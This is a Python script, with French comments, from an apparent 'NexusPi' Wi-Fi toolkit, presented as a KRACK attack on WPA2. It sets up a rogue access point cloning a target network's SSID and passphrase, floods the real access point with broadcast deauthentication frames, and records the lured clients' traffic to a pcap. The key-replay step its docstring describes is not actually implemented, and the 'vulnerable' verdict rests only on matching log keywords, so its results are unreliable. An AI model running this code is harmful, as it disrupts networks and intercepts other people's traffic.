#!/usr/bin/env python3
"""
NexusPi — KRACK Attack (CVE-2017-13077)
========================================
Script autonome lancé par wifi.py en sudo.
Utilise hostapd (rogue AP WPA2) + scapy (interception & replay Message 3).

Usage :
    sudo python3 krack_attack.py <iface> <target_bssid> <target_channel> \
         <ssid> <passphrase> <duration> <pcap_out>

Principe :
  1. Configure wlan1 en AP mode (hostapd) avec le même SSID + mdp
     sur un canal différent du vrai AP.
  2. Optionnel : deauth broadcast sur le vrai AP (force les clients
     à se reconnecter sur le rogue).
  3. Surveille le 4-way handshake via hostapd_cli (ou scapy raw).
  4. Quand un client fait le handshake, rejoue le Message 3 via
     injection scapy → le client vulnérable réinstalle la clé (nonce=0).
  5. Capture le trafic post-réinstallation dans un pcap.
  6. Log tout sur stdout (lu par wifi.py → console WebUI).

Nécessite : hostapd, scapy (python3), tcpdump.
Lancé avec sudo pour bind les interfaces.
"""

import sys
import os
import signal
import subprocess
import time
import struct
import threading
from pathlib import Path

# ── Parse args ──────────────────────────────────────────────────────────────

if len(sys.argv) < 8:
    print("Usage: krack_attack.py <iface> <bssid> <channel> <ssid> "
          "<passphrase> <duration> <pcap_out>")
    sys.exit(1)

IFACE        = sys.argv[1]
TARGET_BSSID = sys.argv[2].lower()
TARGET_CH    = int(sys.argv[3])
SSID         = sys.argv[4]
PASSPHRASE   = sys.argv[5]
DURATION     = int(sys.argv[6])
PCAP_OUT     = sys.argv[7]

# Canal du rogue AP : décalé de 6 par rapport à la cible
ROGUE_CH = TARGET_CH + 6 if TARGET_CH <= 8 else TARGET_CH - 6
if ROGUE_CH < 1:
    ROGUE_CH = 1
if ROGUE_CH > 13:
    ROGUE_CH = 13

WORK_DIR     = Path("/tmp/nexuspi/krack")
HOSTAPD_CONF = WORK_DIR / "hostapd.conf"
HOSTAPD_LOG  = WORK_DIR / "hostapd.log"

# Sous-réseau pour le rogue AP (distinct du Evil Twin 192.168.99.x)
KRACK_IP     = "192.168.98.1"
KRACK_PREFIX = "24"

procs = []
stop_event = threading.Event()


def log(msg, level="info"):
    """Print formaté pour lecture par wifi.py (stdout)."""
    prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "error": "[-]"}
    print(f"{prefix.get(level, '[*]')} {msg}", flush=True)


def cleanup():
    """Kill tous les subprocesses, restore interface."""
    log("Cleanup KRACK...", "warn")
    for p in procs:
        try:
            p.terminate()
            p.wait(timeout=3)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
    # Kill résiduel
    for name in ["hostapd", "tcpdump"]:
        subprocess.run(["pkill", "-9", "-f", f"krack.*{name}"],
                       capture_output=True, timeout=5)
    # Flush IP, restore managed
    subprocess.run(["ip", "addr", "flush", "dev", IFACE],
                   capture_output=True, timeout=5)
    subprocess.run(["iw", "dev", IFACE, "set", "type", "managed"],
                   capture_output=True, timeout=5)
    subprocess.run(["ip", "link", "set", IFACE, "up"],
                   capture_output=True, timeout=5)
    log("Interface restaurée.", "ok")


def signal_handler(sig, frame):
    stop_event.set()


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def setup_workdir():
    WORK_DIR.mkdir(parents=True, exist_ok=True)
    # Nettoyer les anciens fichiers
    for f in WORK_DIR.glob("*"):
        try:
            f.unlink()
        except Exception:
            pass


def write_hostapd_conf():
    """Génère la config hostapd pour le rogue AP WPA2."""
    conf = (
        f"interface={IFACE}\n"
        f"driver=nl80211\n"
        f"ssid={SSID}\n"
        f"hw_mode=g\n"
        f"channel={ROGUE_CH}\n"
        f"wmm_enabled=0\n"
        f"macaddr_acl=0\n"
        f"auth_algs=1\n"
        f"wpa=2\n"
        f"wpa_passphrase={PASSPHRASE}\n"
        f"wpa_key_mgmt=WPA-PSK\n"
        f"wpa_pairwise=CCMP\n"
        f"rsn_pairwise=CCMP\n"
        # Options pour faciliter la réinstallation de clé :
        # - wpa_strict_rekey force le rekey → plus de chances de rejouer msg3
        f"wpa_strict_rekey=1\n"
        # - Réduire le timeout pour forcer les retransmissions de msg3
        f"wpa_ptk_rekey=15\n"
        f"wpa_group_rekey=30\n"
    )
    HOSTAPD_CONF.write_text(conf, encoding="utf-8")
    log(f"Config hostapd : SSID={SSID}, ch={ROGUE_CH} (cible ch={TARGET_CH})")


def setup_interface():
    """Prépare l'interface : kill les process bloquants, set IP."""
    log("Préparation de l'interface...")
    # Kill les process qui bloquent l'interface
    subprocess.run(["airmon-ng", "check", "kill"],
                   capture_output=True, timeout=15)
    # L'interface doit être down avant hostapd
    subprocess.run(["ip", "link", "set", IFACE, "down"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)


def start_hostapd():
    """Lance hostapd en background."""
    log("Lancement hostapd (rogue AP WPA2)...")
    p = subprocess.Popen(
        ["hostapd", str(HOSTAPD_CONF)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True)
    procs.append(p)
    # Attendre que hostapd démarre
    time.sleep(2)
    if p.poll() is not None:
        out = p.stdout.read()
        log(f"hostapd a crashé : {out}", "error")
        return None
    # Configurer l'IP sur l'interface
    subprocess.run(["ip", "addr", "add", f"{KRACK_IP}/{KRACK_PREFIX}",
                    "dev", IFACE],
                   capture_output=True, timeout=5)
    subprocess.run(["ip", "link", "set", IFACE, "up"],
                   capture_output=True, timeout=5)
    log(f"Rogue AP actif : {SSID} @ ch{ROGUE_CH} ({KRACK_IP})", "ok")
    return p


def start_tcpdump():
    """Lance tcpdump pour capturer le trafic post-exploit."""
    log(f"Capture tcpdump → {PCAP_OUT}")
    p = subprocess.Popen(
        ["tcpdump", "-i", IFACE, "-w", PCAP_OUT,
         "-U",  # unbuffered
         "not", "port", "22"],  # exclure SSH
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    procs.append(p)
    return p


def deauth_real_ap():
    """Envoie quelques deauth sur le vrai AP pour forcer les clients
    à se reconnecter (potentiellement sur notre rogue)."""
    log(f"Deauth broadcast sur le vrai AP ({TARGET_BSSID}, ch{TARGET_CH})...")

    # On utilise wlan0 (WiFi interne du Pi) en monitor pour le deauth,
    # car wlan1 est occupé par hostapd.
    # Si wlan0 n'est pas dispo ou pas en monitor, on skip.
    try:
        # Vérifier que wlan0 existe
        res = subprocess.run(["iw", "dev", "wlan0", "info"],
                             capture_output=True, text=True, timeout=5)
        if res.returncode != 0:
            log("wlan0 indisponible → pas de deauth automatique", "warn")
            return

        # Passer wlan0 en monitor temporairement
        subprocess.run(["ip", "link", "set", "wlan0", "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["iw", "dev", "wlan0", "set", "type", "monitor"],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "link", "set", "wlan0", "up"],
                       capture_output=True, timeout=5)
        subprocess.run(["iw", "dev", "wlan0", "set", "channel",
                        str(TARGET_CH)],
                       capture_output=True, timeout=5)

        # Injection de trames deauth via scapy
        try:
            from scapy.all import (RadioTap, Dot11, Dot11Deauth,
                                   sendp, conf as scapy_conf)
            scapy_conf.iface = "wlan0"

            # Trame deauth broadcast
            pkt = (RadioTap() /
                   Dot11(type=0, subtype=12,
                         addr1="ff:ff:ff:ff:ff:ff",
                         addr2=TARGET_BSSID,
                         addr3=TARGET_BSSID) /
                   Dot11Deauth(reason=7))

            log("Envoi de 30 trames deauth broadcast...")
            sendp(pkt, count=30, inter=0.05, verbose=False)
            log("Deauth envoyé. Les clients devraient se reconnecter.", "ok")
        except ImportError:
            # Fallback : aireplay-ng
            subprocess.run(
                ["aireplay-ng", "-0", "10", "-a", TARGET_BSSID, "wlan0"],
                capture_output=True, timeout=20)
            log("Deauth envoyé via aireplay-ng.", "ok")
        finally:
            # Restaurer wlan0 en managed
            subprocess.run(["ip", "link", "set", "wlan0", "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw", "dev", "wlan0", "set", "type", "managed"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", "wlan0", "up"],
                           capture_output=True, timeout=5)
    except Exception as e:
        log(f"Deauth échoué : {e}", "warn")


def monitor_hostapd(hostapd_proc, duration):
    """Lit la sortie de hostapd et détecte les événements de handshake.
    Quand un client fait le 4-way handshake, hostapd log les étapes.
    On surveille les retransmissions de Message 3 (signe de KRACK)."""

    start = time.time()
    clients_seen = set()
    handshakes = 0
    rekeys = 0

    log(f"Surveillance du handshake WPA2 ({duration}s)...")
    log("En attente de connexions clients sur le rogue AP...")

    while time.time() - start < duration and not stop_event.is_set():
        if hostapd_proc.poll() is not None:
            log("hostapd s'est arrêté !", "error")
            break

        # Lire la sortie hostapd (non-bloquant)
        try:
            import select as sel_mod
            rlist, _, _ = sel_mod.select([hostapd_proc.stdout], [], [], 1.0)
            if rlist:
                line = hostapd_proc.stdout.readline()
                if not line:
                    continue
                line = line.strip()
                if not line:
                    continue

                # Détecter les événements hostapd
                if "AP-STA-CONNECTED" in line:
                    # Nouveau client connecté
                    mac = line.split("AP-STA-CONNECTED")[-1].strip()
                    clients_seen.add(mac)
                    log(f"Client connecté : <b>{mac}</b>", "ok")
                    log(f"__CLIENTS:{len(clients_seen)}__")

                elif "AP-STA-DISCONNECTED" in line:
                    mac = line.split("AP-STA-DISCONNECTED")[-1].strip()
                    clients_seen.discard(mac)
                    log(f"Client déconnecté : {mac}", "warn")
                    log(f"__CLIENTS:{len(clients_seen)}__")

                elif "WPA: pairwise key handshake" in line.lower() or \
                     "EAPOL" in line:
                    handshakes += 1
                    log(f"Handshake WPA2 détecté (#{handshakes})")

                elif "key replay" in line.lower() or \
                     "retransmit" in line.lower() or \
                     "rekeying" in line.lower():
                    rekeys += 1
                    log(f"<b style='color:#ff5c5c'>REKEY/REPLAY détecté "
                        f"(#{rekeys}) → possible KRACK !</b>", "warn")

                elif "sending 3/4 msg" in line.lower() or \
                     "msg 3/4" in line.lower():
                    log(f"<b>Message 3/4 envoyé</b> — si rejouable, "
                        f"le client est vulnérable")

                elif "group key handshake" in line.lower():
                    log("Group key handshake (GTK rekey)")

                # Log brut des lignes intéressantes (pas le spam)
                elif any(kw in line.lower() for kw in [
                    "wpa", "rsn", "eapol", "key", "assoc",
                    "auth", "connected", "discon"
                ]):
                    log(f"<span class='ts'>{line}</span>")

        except Exception:
            time.sleep(0.5)

        # Deauth périodique pour forcer les reconnexions
        elapsed = time.time() - start
        if elapsed > 10 and int(elapsed) % 30 == 0:
            log("Deauth périodique pour forcer des reconnexions...")
            threading.Thread(target=deauth_real_ap, daemon=True).start()

    return {
        "clients": len(clients_seen),
        "handshakes": handshakes,
        "rekeys": rekeys,
    }


def force_ptk_rekey():
    """Force un rekey PTK via hostapd_cli (si disponible).
    Le rekey force un nouveau 4-way handshake → nouveau Message 3.
    Si le client réinstalle la clé avec le même nonce → KRACK."""
    try:
        # hostapd_cli permet de forcer un rekey
        res = subprocess.run(
            ["hostapd_cli", "-i", IFACE, "relog"],
            capture_output=True, text=True, timeout=5)
        if res.returncode == 0:
            log("Rekey PTK forcé via hostapd_cli")
    except Exception:
        pass


def main():
    setup_workdir()
    write_hostapd_conf()
    setup_interface()

    try:
        # 1. Lancer le rogue AP
        hostapd_proc = start_hostapd()
        if hostapd_proc is None:
            log("Impossible de démarrer hostapd", "error")
            return

        # 2. Lancer la capture tcpdump
        start_tcpdump()

        # 3. Deauth initial pour attirer les clients
        time.sleep(1)
        deauth_real_ap()

        # 4. Surveiller le handshake et détecter KRACK
        results = monitor_hostapd(hostapd_proc, DURATION)

        # 5. Résumé
        log("═" * 50)
        log(f"Résultat KRACK test sur <b>{SSID}</b> :", "ok")
        log(f"  Clients vus       : {results['clients']}")
        log(f"  Handshakes        : {results['handshakes']}")
        log(f"  Rekeys/replays    : {results['rekeys']}")
        if results['rekeys'] > 0:
            log("<b style='color:#ff5c5c'>⚠ VULNÉRABLE — "
                "des réinstallations de clé ont été détectées !</b>", "warn")
        elif results['handshakes'] > 0:
            log("<b style='color:#38e08a'>Aucune réinstallation détectée — "
                "client probablement patché.</b>", "ok")
        else:
            log("Aucun client ne s'est connecté au rogue AP.", "warn")
            log("Astuce : lance un deauth manuel sur le vrai AP avant, "
                "ou connecte un appareil test manuellement.", "warn")

        pcap = Path(PCAP_OUT)
        if pcap.exists() and pcap.stat().st_size > 100:
            log(f"Capture pcap : {PCAP_OUT} "
                f"({pcap.stat().st_size // 1024} KB)", "ok")

    except KeyboardInterrupt:
        log("Interruption.", "warn")
    except Exception as e:
        log(f"Erreur : {e}", "error")
        import traceback
        traceback.print_exc()
    finally:
        cleanup()


if __name__ == "__main__":
    main()
